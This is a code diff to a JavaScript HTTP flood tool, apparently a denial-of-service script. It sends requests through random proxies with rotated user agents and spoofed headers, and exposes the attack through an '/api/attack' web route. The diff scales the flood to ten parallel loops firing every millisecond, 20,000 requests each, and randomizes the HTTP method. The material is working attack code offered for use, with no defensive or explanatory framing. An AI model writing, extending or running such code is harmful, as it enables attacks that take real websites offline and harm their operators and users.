@@ -413,10 +413,14 @@ function isValidProxy(proxy) {
 
 function send(target, proxy, ua) {
   if (!isValidProxy(proxy)) return;
-  
+
   const agent = new HttpsProxyAgent('http://' + proxy);
-  
-  axios.get(target, {
+  const methods = ['GET', 'POST', 'HEAD'];
+  const method = rand(methods);
+
+  axios({
+    url: target,
+    method,
     httpAgent: agent,
     headers: {
       'User-Agent': ua,
@@ -431,21 +435,24 @@ function send(target, proxy, ua) {
       'TE': 'Trailers'
     },
     timeout: 5000
-  }).catch(() => {}); 
+  }).catch(() => {});
 }
 
 async function attack(target) {
   const proxies = await fetchList(proxyURL);
   const uas = await fetchList(uaURL);
   if (proxies.length === 0 || uas.length === 0) return;
-  let i = 0;
-  const interval = setInterval(() => {
-    const proxy = rand(proxies);
-    const ua = rand(uas);
-    send(target, proxy, ua);
-    i++;
-    if (i >= 2000) clearInterval(interval);
-  }, 5);
+
+  for (let t = 0; t < 10; t++) { 
+    let i = 0;
+    const interval = setInterval(() => {
+      const proxy = rand(proxies);
+      const ua = rand(uas);
+      send(target, proxy, ua);
+      i++;
+      if (i >= 20000) clearInterval(interval); 
+    }, 1);
+  }
 }
 
 app.get('/api/attack/:url(*)', async (req, res) => {
